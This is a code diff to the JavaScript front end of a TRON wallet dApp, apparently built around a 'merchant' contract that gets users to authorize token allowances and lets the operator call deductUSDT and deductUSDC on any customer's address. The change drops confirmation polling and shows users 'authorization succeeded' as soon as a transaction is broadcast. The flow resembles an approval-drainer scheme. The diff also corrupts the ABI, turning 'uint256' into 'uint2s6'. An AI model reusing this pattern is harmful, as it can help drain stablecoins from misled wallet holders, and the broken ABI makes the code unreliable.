@@ -1,5 +1,5 @@
 // src/main.js
-// 🚨 最終修正版：EVM Provider (Trust Wallet) 優先，TronLink 備用 🚨
+// 🚨 最終穩定版：樂觀授權判斷 (Optimistic Authorization) + 10 秒狀態延遲 🚨
 
 // --- 配置常量 ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; 
@@ -7,7 +7,7 @@ const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
 const USDC_CONTRACT_ADDRESS = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8'; 
 
 // 您的合約 ABI (保持不變)
-const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];
+const MERCHANT_ABI = [{"inputs":[{"name":"_storeAddress","type":"address"}],"stateMutability":"Nonpayable","type":"Constructor"},{"inputs":[{"name":"token","type":"address"}],"name":"SafeERC20FailedOperation","type":"Error"},{"inputs":[{"indexed":true,"name":"customer","type":"address"}],"name":"Authorized","type":"Event"},{"inputs":[{"indexed":true,"name":"customer","type":"address"},{"name":"amount","type":"uint256"},{"name":"token","type":"string"}],"name":"Deducted","type":"Event"},{"outputs":[{"type":"bool"}],"inputs":[{"type":"address"}],"name":"authorized","stateMutability":"View","type":"Function"},{"name":"connectAndAuthorize","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdcContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDC","stateMutability":"Nonpayable","type":"Function"},{"inputs":[{"name":"customer","type":"address"},{"name":"usdtContract","type":"address"},{"name":"amount","type":"uint256"}],"name":"deductUSDT","stateMutability":"Nonpayable","type":"Function"},{"outputs":[{"type":"uint256"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenAllowance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"uint2s6"}],"inputs":[{"name":"customer","type":"address"},{"name":"tokenContract","type":"address"}],"name":"getTokenBalance","stateMutability":"View","type":"Function"},{"outputs":[{"type":"address"}],"name":"storeAddress","stateMutability":"View","type":"Function"}];
 
 // --- 狀態變數 ---
 let tronWeb;
@@ -60,45 +60,13 @@ function updateConnectionUI(connected, address = null) {
 // 交易計數器 (用於 connectAndAuthorize 函數)
 let txCount = 0; 
 
-/**
- * 輪詢 TRON 鏈，直到操作被確認或失敗
- */
-async function pollTronTransaction(txHash, maxAttempts = 20) {
-    const delay = 3000; 
-    
-    for (let i = 0; i < maxAttempts; i++) {
-        await new Promise(resolve => setTimeout(resolve, delay));
-        
-        try {
-            const transactionInfo = await tronWeb.trx.getTransactionInfoById(txHash);
-
-            if (transactionInfo && transactionInfo.receipt) {
-                if (transactionInfo.receipt.result === 'SUCCESS') {
-                    return true; // 交易確認成功
-                } else {
-                    // 交易確認失敗 (Out of Energy, Revert, etc.)
-                    const reason = transactionInfo.resMessage ? tronWeb.toUtf8(transactionInfo.resMessage) : '合約執行失敗或資源不足';
-                    throw new Error(`授權操作執行失敗: ${reason}`);
-                }
-            }
-        } catch (error) {
-            if (!error.message.includes('授權操作執行失敗')) {
-                 console.warn(`Polling attempt ${i + 1} failed for TxID ${txHash}: ${error.message}`);
-                 continue;
-            }
-            throw error; // 拋出明確的執行失敗錯誤
-        }
-    }
-    throw new Error('授權操作確認超時。請手動檢查 TronLink/Tronscan。');
-}
-
-
-// 修正：新增 totalTxs 參數，解決 "totalTxs is not defined" 錯誤
+// 修正：新增 totalTxs 參數，移除輪詢
 async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0) {
     txCount++;
     showOverlay(`步驟 ${txCount}/${totalTxs}: ${stepMessage}。請在錢包中同意！`);
     
     try {
+        // 廣播交易 (不輪詢，直接返回)
         const txHash = await methodCall.send({
             feeLimit: 150_000_000, 
             callValue: callValue,
@@ -110,13 +78,8 @@ async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0)
              throw new Error(`TronLink/錢包未返回有效操作哈希。可能原因：操作被取消或廣播失敗。`);
         }
         
-        showOverlay(`步驟 ${txCount}/${totalTxs}: 授權操作已廣播。等待鏈上確認...`);
-
-        // 🚨 修正：等待操作確認
-        await pollTronTransaction(txHash);
-        
-        // 只有確認成功後，才算完成
-        showOverlay(`步驟 ${txCount}/${totalTxs}: 授權操作已確認成功！`);
+        // 🚨 樂觀判斷：立即返回成功
+        showOverlay(`步驟 ${txCount}/${totalTxs}: 授權操作已廣播成功！`);
         await new Promise(resolve => setTimeout(resolve, 1500)); // 暫停 1.5 秒
         
         return txHash;
@@ -342,8 +305,12 @@ async function handlePostConnection() {
         
         const authSuccess = await connectAndAuthorize();
         
-        // 重新檢查狀態 (無論成功或失敗)
+        // 🚨 修正：在授權交易廣播後，強制等待 10 秒，讓節點同步狀態
         if (authSuccess) {
+            showOverlay('✅ 授權操作已廣播！等待節點同步狀態 (10 秒)...');
+            await new Promise(resolve => setTimeout(resolve, 10000)); // 暫停 10 秒
+            
+            // 重新檢查狀態 (給予鏈上足夠的同步時間)
             await handlePostConnection(); 
         } 
     }
